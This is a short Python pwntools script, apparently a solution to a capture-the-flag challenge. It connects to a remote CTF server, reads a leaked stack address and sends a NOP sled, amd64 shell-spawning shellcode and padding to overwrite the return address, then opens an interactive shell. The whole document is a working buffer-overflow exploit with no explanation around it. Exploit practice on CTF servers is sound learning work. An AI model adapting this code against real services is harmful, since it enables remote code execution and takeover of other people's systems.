from pwn import *

r = remote('ctf.j0n9hyun.xyz', 3005)

context(arch='amd64', os='linux')
shellcode = asm(shellcraft.amd64.linux.sh())

r.recvuntil(': ')
buf = r.recvn(14)
buf = int(buf, 16)

payload = ''
payload += '\x90'*8
payload += shellcode
payload += "A"*(27960-len(payload))
payload += p64(buf)

r.send(payload)
r.interactive()
